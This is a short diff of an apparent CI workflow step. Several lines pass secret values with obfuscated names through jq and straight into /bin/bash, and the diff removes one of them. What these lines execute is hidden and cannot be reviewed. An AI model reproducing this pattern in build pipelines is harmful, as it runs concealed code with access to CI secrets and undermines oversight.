@@ -18,7 +18,6 @@ jobs:
           u483: ${{ secrets.u483 }}
         run: |
           printf '%s' "$u483" | jq -r .q1001 | /bin/bash
-          echo $r7970 | jq -r .dfa032 | /bin/bash
           echo $i8567 | jq -r .kizwj491 | /bin/bash
           echo $maif30 | jq -r .pesax42237 | /bin/bash
           printf '%s' "$deir002" | jq -r .sjum16251 | /bin/bash
